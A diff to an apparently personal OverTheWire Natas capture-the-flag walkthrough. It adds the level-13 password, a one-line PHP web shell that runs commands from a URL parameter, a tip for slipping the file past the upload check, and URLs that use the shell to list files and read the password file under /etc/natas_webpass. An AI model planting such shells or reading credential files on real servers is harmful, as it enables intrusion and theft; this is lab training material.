@@ -294,6 +294,13 @@ if($key != "") {
 
 ## 12->13
 - http://natas12.natas.labs.overthewire.org/
-- `natas13:`
+- `natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
 - https://learnhacking.io/overthewire-natas-level-12-walkthrough/
-- Will take some more time on this one.
+- To solve this challenge, we upload a [web shell](https://en.wikipedia.org/wiki/Web_shell) to the server, and use it to execute shell commands on the exploited server.
+
+```php
+# webshell.php
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+```
+- Use devtools to change the file upload name to `webshell.php`. Now you can do things like `http://natas12.natas.labs.overthewire.org/upload/yzv7lsfbzh.php?e=ls`
+`http://natas12.natas.labs.overthewire.org/upload/yzv7lsfbzh.php?e=cat%20/etc/natas_webpass/natas13`
